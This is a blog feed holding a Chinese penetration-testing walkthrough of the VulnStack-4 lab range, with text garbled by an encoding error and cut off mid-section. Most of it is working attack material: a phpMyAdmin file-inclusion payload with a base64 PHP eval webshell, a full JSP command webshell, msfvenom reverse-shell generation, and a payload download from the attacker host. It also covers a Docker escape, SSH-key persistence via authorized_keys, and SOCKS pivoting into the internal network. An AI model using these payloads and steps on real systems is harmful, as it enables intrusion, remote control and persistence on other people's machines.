<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Extraderã®åšå®¢</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.extrader.top/"/>
  <updated>2021-07-06T06:05:34.767Z</updated>
  <id>https://www.extrader.top/</id>
  
  <author>
    <name>Extrader</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>VulnStack-4é¶åœºç»ƒä¹ </title>
    <link href="https://www.extrader.top/posts/b57d0eac/"/>
    <id>https://www.extrader.top/posts/b57d0eac/</id>
    <published>2021-07-06T12:00:00.000Z</published>
    <updated>2021-07-06T06:05:34.767Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡å…¨ç¨‹å‚è€ƒ <a href="https://www.freebuf.com/articles/network/244704.html">è®°ä¸€æ¬¡Vulnstacké¶åœºå†…ç½‘æ¸—é€ï¼ˆäºŒï¼‰</a> æ¥å¤ç°æ¸—é€è¿‡ç¨‹ï¼Œç›®çš„åœ¨äºå­¦ä¹ æ¸—é€æµç¨‹å’ŒåŸºæœ¬æ€è·¯ï¼Œè®°å½•ä¸‹å­¦ä¹ ç¬”è®°</p><span id="more"></span><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>VMware</p><p>é¶æœºåœ°å€ï¼š<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/</a></p><p>æ”»å‡»æœºKali (192.168.183.106)</p><p>è™šæ‹Ÿç½‘å¡é…ç½®</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630130756345.png" alt loading="lazy"></p><p>Ubuntu webæœåŠ¡å™¨ç½‘å¡é…ç½®ï¼Œé…ä¸¤å¼ ç½‘å¡ï¼ˆ192.168.183.105ï¼Œ192.168.183.128ï¼‰</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630131230765.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630131200044.png" alt loading="lazy"></p><p>DC Windows Server 2008 R2æœåŠ¡å™¨ç½‘å¡é…ç½®ï¼ˆ192.168.183.130ï¼‰</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630131335941.png" alt loading="lazy"></p><p>Windows 7ç½‘å¡é…ç½®ï¼ˆ192.168.183.129ï¼‰</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630131525870.png" alt loading="lazy"></p><h3 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h3><p>nmapä¿¡æ¯æœé›†</p><pre class="language-shell" data-language="shell"><code class="language-shell">nmap -T4 -A -sN <span class="token number">192.168</span>.0.105</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704205813557.png" alt loading="lazy"></p><p>å¼€å¯äº†<code>ssh</code>ï¼Œ<code>tomcat</code>ï¼Œ<code>phpmyadmin</code>ç­‰æœåŠ¡</p><h3 id="Webæ¸—é€"><a href="#Webæ¸—é€" class="headerlink" title="Webæ¸—é€"></a>Webæ¸—é€</h3><h4 id="phpmyadminæ¸—é€"><a href="#phpmyadminæ¸—é€" class="headerlink" title="phpmyadminæ¸—é€"></a>phpmyadminæ¸—é€</h4><p>çœ‹åˆ°<code>phpmyadmin</code>ç‰ˆæœ¬ä¸º4.8.1ï¼Œæƒ³åˆ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆCVE-2018-12613ï¼‰</p><pre class="language-shell" data-language="shell"><code class="language-shell">searchsploit phpmyadmin <span class="token number">4.8</span>.1</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630142047587.png" alt loading="lazy"></p><p>æµ‹è¯•payloadï¼š</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//192.168.0.105:2003/index.php?target=db_sql.php%253f/../../../../../etc/passwd</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704205952878.png" alt loading="lazy"></p><p>åˆ©ç”¨<code>session</code>æ–‡ä»¶åŒ…å«ï¼ŒæŸ¥è¯¢ä¸€æ¡<code>sql</code>è¯­å¥ï¼Œ<code>file_put_contents</code>å†™æ–‡ä»¶</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT &#39;&lt;?php file_put_contents(&quot;extrader.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pPz4&#x3D;&quot;));?&gt;</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704210700760.png" alt loading="lazy"></p><p><code>cookie</code>ä¸­<code>phpMyAdmin</code>çš„å€¼ä¸º<code>d70bbb50bbcc99dde55870cf69eda13b</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704210737586.png" alt loading="lazy"></p><p>è®¿é—®<code>http://192.168.0.105:2003/index.php?target=db_sql.php%3f../../../../../../../tmp/sess_d70bbb50bbcc99dde55870cf69eda13b</code>ï¼ŒæŠŠshellå†™è¿›å»</p><p>éšåèšå‰‘è¿æ¥</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704211035539.png" alt loading="lazy"></p><p>æˆåŠŸè¿æ¥</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704211100989.png" alt loading="lazy"></p><h4 id="tomcatæ¸—é€"><a href="#tomcatæ¸—é€" class="headerlink" title="tomcatæ¸—é€"></a>tomcatæ¸—é€</h4><pre class="language-shell" data-language="shell"><code class="language-shell">searchsploit tomcat <span class="token number">8.5</span>.19</code></pre><p>ç”±nmapæ‰«æä¿¡æ¯å¯çŸ¥ï¼Œ2002ç«¯å£çš„Tomcatç‰ˆæœ¬ä¸º8.5.19ï¼Œsearchä¸€ä¸‹å‘ç°æœ‰æ´</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630142226990.png" alt loading="lazy"></p><p>ç”¨ç¬¬ä¸€ä¸ªè„šæœ¬è¿›è¡Œexploit</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630142742574.png" alt loading="lazy"></p><p>æˆåŠŸæ‹¿åˆ°rootæƒé™</p><p>åˆ©ç”¨æ¼æ´åŸç†ä¼ ä¸ªshellï¼Œå¥½æ‰§è¡Œå‘½ä»¤</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630144121828.png" alt loading="lazy"></p><pre class="language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page import&#x3D;&quot;java.util.*,java.io.*,java.net.*&quot;%&gt;&lt;%%&gt;&lt;HTML&gt;&lt;BODY&gt;&lt;FORM METHOD&#x3D;&quot;POST&quot; NAME&#x3D;&quot;myform&quot; ACTION&#x3D;&quot;&quot;&gt;&lt;INPUT TYPE&#x3D;&quot;text&quot; NAME&#x3D;&quot;cmd&quot;&gt;&lt;INPUT TYPE&#x3D;&quot;submit&quot; VALUE&#x3D;&quot;Send&quot;&gt;&lt;&#x2F;FORM&gt;&lt;pre&gt;&lt;%if (request.getParameter(&quot;cmd&quot;) !&#x3D; null) &#123;    out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;\n&lt;BR&quot;);    Process p &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));    OutputStream os &#x3D; p.getOutputStream();    InputStream in &#x3D; p.getInputStream();    DataInputStream dis &#x3D; new DataInputStream(in);    String disr &#x3D; dis.readLine();    while ( disr !&#x3D; null ) &#123;        out.println(disr); disr &#x3D; dis.readLine();     &#125;&#125;%&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;BODY&gt;&lt;&#x2F;HTML&gt;</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630144244721.png" alt loading="lazy"></p><h3 id="Dockerä¸»æœºé€ƒé€¸"><a href="#Dockerä¸»æœºé€ƒé€¸" class="headerlink" title="Dockerä¸»æœºé€ƒé€¸"></a>Dockerä¸»æœºé€ƒé€¸</h3><p><strong>msfå¼¹shell</strong></p><pre class="language-shell" data-language="shell"><code class="language-shell">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.0.106 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> -f elf <span class="token operator">></span> shell.elf</code></pre><p>ç”Ÿæˆä¸€ä¸ª<code>msf</code>é©¬<code>shell.elf</code></p><p>åœ¨æœ¬åœ°ç”¨pythonå¼€ä¸€ä¸ªhttpæœåŠ¡</p><pre class="language-shell" data-language="shell"><code class="language-shell">python3 -m http.server</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704211900711.png" alt loading="lazy"></p><p>ä¸‹è½½shellå¹¶ç»™æƒé™</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">wget</span> http://192.168.0.106:8000/shell.elf<span class="token function">chmod</span> <span class="token number">777</span> shell.elf</code></pre><p>kaliæœºå¼€å¯ç›‘å¬</p><pre class="language-shell" data-language="shell"><code class="language-shell">msfconsoleuse exploit/multi/handler<span class="token builtin class-name">set</span> PAYLOAD linux/x86/meterpreter/reverse_tcp<span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.183.1show optionsrun</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704211955352.png" alt loading="lazy"></p><p>éšåé¶æœºä¸Šæ‰§è¡Œ<code>./shell.elf</code>ï¼Œmsfå³å¯æˆåŠŸè·å¾—ä¼šè¯</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704212038957.png" alt loading="lazy"></p><h4 id="åˆ©ç”¨CVE-2019-5736é€ƒé€¸"><a href="#åˆ©ç”¨CVE-2019-5736é€ƒé€¸" class="headerlink" title="åˆ©ç”¨CVE-2019-5736é€ƒé€¸"></a><strong>åˆ©ç”¨CVE-2019-5736é€ƒé€¸</strong></h4><p>åœ¨Docker 18.09.2ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ä½¿ç”¨çš„runcç‰ˆæœ¬å°äº1.0-rc6ï¼Œå› æ­¤å…è®¸æ”»å‡»è€…é‡å†™å®¿ä¸»æœºä¸Šçš„runc äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨å®¿ä¸»æœºä¸Šä»¥rootèº«ä»½æ‰§è¡Œå‘½ä»¤ã€‚</p><p>å¹³å°æˆ–äº§å“ å—å½±å“ç‰ˆæœ¬ Docker Version &lt; 18.09.2 runC Version &lt;= 1.0-rc6</p><p>æ¶æ„å®¹å™¨éœ€æ»¡è¶³ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶ä¹‹ä¸€ï¼š</p><ul><li>ç”±ä¸€ä¸ªæ”»å‡»è€…æ§åˆ¶çš„æ¶æ„é•œåƒåˆ›å»º</li><li>æ”»å‡»è€…å…·æœ‰æŸå·²å­˜åœ¨å®¹å™¨çš„å†™æƒé™ï¼Œä¸”å¯é€šè¿‡docker execè¿›å…¥ã€‚</li></ul><p>Pocåœ°å€ï¼š<a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p><p>æ˜¯ä¸€ä¸ªgoå†™çš„è„šæœ¬ï¼Œéœ€è¦è‡ªå·±ä¸‹è½½ç¼–è¯‘</p><p>å…ˆè£…goç¯å¢ƒ</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">cd</span> /usr/local<span class="token function">wget</span> https://studygolang.com/dl/golang/go1.16.5.linux-amd64.tar.gz<span class="token function">tar</span> -xzf go1.16.5.linux-amd64.tar.gz<span class="token function">vim</span> /etc/profileæ·»åŠ  <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/usr/local/go/bin<span class="token builtin class-name">source</span> /etc/profilego version</code></pre><p>å‡ºç°ç‰ˆæœ¬å·å³å®‰è£…æˆåŠŸ</p><p>ç¼–è¯‘ç”Ÿæˆpayload</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token assign-left variable">CGO_ENABLED</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">GOOS</span><span class="token operator">=</span>linux <span class="token assign-left variable">GOARCH</span><span class="token operator">=</span>amd64 go build main.go</code></pre><p>ç”¨msfä¼šè¯å°†ç¼–è¯‘å¾—åˆ°çš„mainæ–‡ä»¶ä¸Šä¼ åˆ°dockerå®¹å™¨çš„/homeç›®å½•ä¸­ï¼Œå¹¶èµ‹æƒ</p><pre class="language-shell" data-language="shell"><code class="language-shell">upload /home/kali/CVE-2019-5736-PoC/main /home</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630153924481.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630154042270.png" alt loading="lazy"></p><p>åœ¨kaliæœºä¸Šç›‘å¬</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">nc</span> -lvp <span class="token number">4444</span></code></pre><p>åˆ°é¶æœºä¸Šæ‰§è¡Œ<code>./main</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630154346666.png" alt loading="lazy"></p><p>æ­¤æ—¶ï¼Œåªéœ€ç­‰å¾…ç›®æ ‡æœºç®¡ç†å‘˜é‡å¯è¯¥dockerå®¹å™¨ï¼Œpayloadå°±ä¼šè§¦å‘ï¼Œå¦‚ä¸‹å›¾ï¼Œæˆ‘ä»¬æ‰‹åŠ¨æ¨¡æ‹Ÿdockeré‡å¯ï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> docker <span class="token builtin class-name">exec</span> -it 09dd4e5bfa91 /bin/bash</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630154713907.png" alt loading="lazy"></p><p>æ˜¾ç¤ºpayloadæ‰§è¡ŒæˆåŠŸ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630154743000.png" alt loading="lazy"></p><p>ä½†æ˜¯å¹¶æœªæ”¶åˆ°shell</p><h4 id="åˆ©ç”¨â€“privilegedç‰¹æƒæ¨¡å¼é€ƒé€¸"><a href="#åˆ©ç”¨â€“privilegedç‰¹æƒæ¨¡å¼é€ƒé€¸" class="headerlink" title="åˆ©ç”¨â€“privilegedç‰¹æƒæ¨¡å¼é€ƒé€¸"></a><strong>åˆ©ç”¨â€“privilegedç‰¹æƒæ¨¡å¼é€ƒé€¸</strong></h4><ul><li>ç‰¹æƒæ¨¡å¼äºç‰ˆæœ¬0.6æ—¶è¢«å¼•å…¥Dockerï¼Œå…è®¸å®¹å™¨å†…çš„rootæ‹¥æœ‰å¤–éƒ¨ç‰©ç†æœºrootæƒé™ï¼Œè€Œæ­¤å‰å®¹å™¨å†…rootç”¨æˆ·ä»…æ‹¥æœ‰å¤–éƒ¨ç‰©ç†æœºæ™®é€šç”¨æˆ·æƒé™ã€‚</li><li>ä½¿ç”¨ç‰¹æƒæ¨¡å¼å¯åŠ¨å®¹å™¨ï¼Œå¯ä»¥è·å–å¤§é‡è®¾å¤‡æ–‡ä»¶è®¿é—®æƒé™ã€‚å› ä¸ºå½“ç®¡ç†å‘˜æ‰§è¡Œ<code>docker run â€”privileged</code>æ—¶ï¼ŒDockerå®¹å™¨å°†è¢«å…è®¸è®¿é—®ä¸»æœºä¸Šçš„æ‰€æœ‰è®¾å¤‡ï¼Œå¹¶å¯ä»¥æ‰§è¡Œmountå‘½ä»¤è¿›è¡ŒæŒ‚è½½ã€‚</li><li>å½“æ§åˆ¶ä½¿ç”¨ç‰¹æƒæ¨¡å¼å¯åŠ¨çš„å®¹å™¨æ—¶ï¼Œdockerç®¡ç†å‘˜å¯é€šè¿‡mountå‘½ä»¤å°†å¤–éƒ¨å®¿ä¸»æœºç£ç›˜è®¾å¤‡æŒ‚è½½è¿›å®¹å™¨å†…éƒ¨ï¼Œè·å–å¯¹æ•´ä¸ªå®¿ä¸»æœºçš„æ–‡ä»¶è¯»å†™æƒé™ï¼Œæ­¤å¤–è¿˜å¯ä»¥é€šè¿‡å†™å…¥è®¡åˆ’ä»»åŠ¡ç­‰æ–¹å¼åœ¨å®¿ä¸»æœºæ‰§è¡Œå‘½ä»¤ã€‚</li></ul><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">mkdir</span> /hack<span class="token function">ls</span> /dev<span class="token punctuation">..</span>.sdasda1sda2sda5<span class="token punctuation">..</span>.</code></pre><p>å°è¯•å°†<code>/dev/sda1</code>æŒ‚è½½åˆ°<code>/hack</code>ç›®å½•é‡Œ<code>mount /dev/sda1 /hack</code>ï¼Œ<code>ls /hack</code>æŸ¥çœ‹ï¼ŒæŒ‚è½½æˆåŠŸ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630155318769.png" alt loading="lazy"></p><p><strong>åœ¨dockerå®¹å™¨é‡ŒæŒ‚è½½ä¸€ä¸ªå®¿ä¸»çš„æœ¬åœ°ç›®å½•ï¼Œè¿™æ ·æŸäº›å®¹å™¨é‡Œè¾“å‡ºçš„æ–‡ä»¶ï¼Œå°±å¯ä»¥åœ¨æœ¬åœ°ç›®å½•ä¸­æ‰“å¼€è®¿é—®äº†ã€‚</strong></p><p>å°†sda1æŒ‚è½½æˆåŠŸï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è®¿é—®å®¹å™¨å†…éƒ¨çš„/hackè·¯å¾„æ¥è¾¾åˆ°è®¿é—®æ•´ä¸ªå®¿ä¸»æœºçš„ç›®çš„ï¼Œæ¯”å¦‚æˆ‘ä»¬è®¿é—®<code>/hack/home</code>ç›®å½•ä¹Ÿå°±æ˜¯è®¿é—®å®¿ä¸»æœºçš„<code>/home</code>ç›®å½•</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630160348268.png" alt loading="lazy"></p><p>æœ¬åœ°ç”Ÿæˆsshç§˜é’¥</p><pre class="language-shell" data-language="shell"><code class="language-shell">ssh-keygen -f hack<span class="token function">chmod</span> <span class="token number">600</span> hack    // ä¸è¦å¿˜è®°å¯¹ç§˜é’¥æ–‡ä»¶èµ‹600æƒé™ï¼Œå¦åˆ™ä¸èƒ½æ‰§è¡Œ</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704212159965.png" alt loading="lazy"></p><p>æˆ‘ä»¬è¦å°†<code>ssh</code>ç§˜é’¥å†™å…¥åˆ°<code>.ssh</code>ç›®å½•é‡Œé¢å¹¶å°†æ–‡ä»¶å‘½åä¸º<code>authorized_keys</code>ï¼ˆç›®æ ‡æœº<code>.ssh</code>ç›®å½•æƒé™å¿…é¡»ä¸º700ï¼‰ã€‚</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">cp</span> -avx /hack/home/ubuntu/.ssh/id_rsa.pub /hack/home/ubuntu/.ssh/authorized_keys    <span class="token comment"># -avxæ˜¯å°†æƒé™ä¹Ÿä¸€èµ·å¤åˆ¶</span><span class="token builtin class-name">echo</span> <span class="token string">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCg9LpD/MuFWzIzUQB4RQCFa8Avljlla4Z0iuk3jMQVxrxcDjOhoaLmXmbS63/crPQ15s1oEzNpi2L0MtU/ZMbDFHpKVJGSwNbZeMzEnYsOMd1x4r6BojP4bN4d2okv4sYVSCgWiNUQBHWQcUcnf3rkFw309maxSIwiNNl1C6jzwCNjo3rWA9YV8869N7q/oZtPob3M5yVT77nYMOdO4mnU/A8dbr8KkmcjoVZclK1aAnu96XJywWmArtfZjF9FdlqUkB9ZhknnpxHqP1/sH5lNk/S/pOQTq94VpU4YdK4aBt5mFj16okbudhNKGOBBlNFECcQIU/11djNDYD+FqVn7H/rKuYa7LOJkNhgXv/Q7tBIuoJBrWKqFSQPxUdiTDzeuWhWVw5Kjzf3sEoTOHqO7oUD23iQHnoO1ZwxJp/CnDRSTyCcxTcUwheM+JTSEXembyDtQWPmt3g24UNish8s3INTPT2Abd1q2mspwuSKWHuZo8yIrNq5mfS8lvkhT1rc= kali@kali'</span> <span class="token operator">></span> /hack/home/ubuntu/.ssh/authorized_keys    <span class="token comment"># å°†sshç§˜é’¥å†™å…¥authorized_keysæ–‡ä»¶</span></code></pre><p>å¦‚æœä¸Šé¢echoä¸è¿›å»å¯ä»¥ç›´æ¥åœ¨msfä¸­ä¸Šä¼ </p><p>æ­¤æ—¶ï¼Œæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨è‡ªå·±çš„ç§é’¥è¿›è¡Œå…å¯†ç™»é™†ç›®æ ‡å®¿ä¸»æœºäº†</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">ssh</span> -i hack ubuntu@192.168.0.105  <span class="token punctuation">(</span>å›¾åé¢åŠ çš„,IPåœ°å€å˜äº†<span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210706112334391.png" alt loading="lazy"></p><h3 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h3><h4 id="å†…ç½‘æ¢æµ‹æ·»åŠ è·¯ç”±"><a href="#å†…ç½‘æ¢æµ‹æ·»åŠ è·¯ç”±" class="headerlink" title="å†…ç½‘æ¢æµ‹æ·»åŠ è·¯ç”±"></a>å†…ç½‘æ¢æµ‹æ·»åŠ è·¯ç”±</h4><p>æˆ‘ä»¬å·²ç»æ‹¿åˆ°ubuntuè¿™å°æœåŠ¡å™¨ï¼Œé‡æ–°å¼¹ä¸ªmeterpreterè¿‡æ¥</p><p>kaliæœºé‡æ–°å¼€å¯ä¸€ä¸ªWebæœåŠ¡ï¼š<code>python3 -m http.server</code></p><p>msfä¸Šç›‘å¬ç«¯å£</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">set</span> AutoRunScript migrate -f  <span class="token punctuation">(</span>è‡ªåŠ¨è¿ç§»è¿›ç¨‹,é˜²æ­¢ç”¨æˆ·åˆ é™¤æœ¨é©¬,ä¸¢å¤±ç›®æ ‡<span class="token punctuation">)</span></code></pre><p>åœ¨ubuntuä¸Šæ‰§è¡Œ</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">wget</span> http://192.168.0.106:8000/shell.elf<span class="token function">chmod</span> <span class="token number">777</span> shell.elf./shell.elf</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210702142225406.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704213704739.png" alt loading="lazy"></p><p>msfä¼ ä¸€ä¸ªewä¸Šå»<code>upload /home/kali/ew_for_linux64 /home/ubuntu</code></p><p><code>ifconfig</code>æŸ¥çœ‹Ubuntuä¸Šçš„å†…ç½‘</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704214545080.png" alt loading="lazy"></p><p>å‘ç°å­˜åœ¨ï¼ˆ192.168.183.1/24ï¼‰è¿™ä¸ªå†…ç½‘</p><p>äºæ˜¯æˆ‘ä»¬åœ¨ubuntuä¸Šå¼€å¯socks5æ­£å‘ä»£ç†</p><p>ewä¸‹é“¾æ¥ï¼š<a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">chmod</span> <span class="token number">777</span> ew_for_linux64./ew_for_linux64 -s ssocksd -l <span class="token number">1080</span> </code></pre><p>æ­¤æ—¶ï¼Œkaliä¸Šçš„åº”ç”¨ç¨‹åºå°±å¯ä»¥é€šè¿‡proxychainsä»£ç†è¿›ç›®æ ‡å†…ç½‘äº†<code>vim /etc/proxychains4.conf</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704214215866.png" alt loading="lazy"></p><p>æ¢æµ‹å†…ç½‘å­˜æ´»çš„ä¸»æœºï¼Œå› ä¸ºä½¿ç”¨çš„æ˜¯socksçš„ä»£ç†ï¼Œåªèƒ½ä½¿ç”¨tcpåè®®ï¼Œæ‰€ä»¥nmapä½¿ç”¨çš„æ—¶å€™è¦ä½¿ç”¨<code>-sT</code>é€‰æ‹©ä½¿ç”¨<code>tcp</code>åè®®ï¼Œè¦ä½¿ç”¨<code>-Pn</code>ä¸ä½¿ç”¨<code>ICMP</code>çš„<code>ping</code>ç¡®è®¤ä¸»æœºå­˜æ´»</p><pre class="language-shell" data-language="shell"><code class="language-shell">proxychains4 nmap -sT -sV -Pn -n -p22,445 <span class="token number">192.168</span>.183.0/24</code></pre><p>ç»è¿‡æ‰«æå¯ä»¥å¾—çŸ¥ç›®æ ‡å†…ç½‘ä¸­è¿˜æœ‰192.168.183.129ï¼ˆWin7ï¼‰å’Œ192.168.183.130ï¼ˆDCï¼‰è¿™ä¸¤å°ä¸»æœºã€‚å¹¶ä¸”éƒ½å¼€äº†445ç«¯å£</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704222620931.png" alt loading="lazy"></p><p>åœ¨msfæ·»åŠ å†…ç½‘è·¯ç”±ï¼Œè¿™é‡Œç›´æ¥åœ¨msfä¸­<code>run autoroute</code>ä¼šæŠ¥é”™</p><p>å…·ä½“å‚è€ƒï¼š<a href="https://www.jason-w.cn/pentest/2021/02/28/242.html">https://www.jason-w.cn/pentest/2021/02/28/242.html</a></p><pre class="language-shell" data-language="shell"><code class="language-shell">backgrounduse post/multi/manage/autorouteshow options<span class="token builtin class-name">set</span> <span class="token environment constant">SESSION</span> <span class="token number">7</span><span class="token builtin class-name">set</span> SUBNET <span class="token number">192.168</span>.183.0show optionsexploitroute</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704221640149.png" alt loading="lazy"></p><p><code>exploit</code>åæŸ¥çœ‹<code>route</code>è·¯ç”±</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704221735839.png" alt loading="lazy"></p><h4 id="ms17-010åˆ©ç”¨"><a href="#ms17-010åˆ©ç”¨" class="headerlink" title="ms17_010åˆ©ç”¨"></a>ms17_010åˆ©ç”¨</h4><p>æ‰«æç›®æ ‡å†…ç½‘ä¸­å¯èƒ½å­˜åœ¨ms17_010æ°¸æ’ä¹‹è“æ¼æ´çš„ä¸»æœº</p><pre class="language-shell" 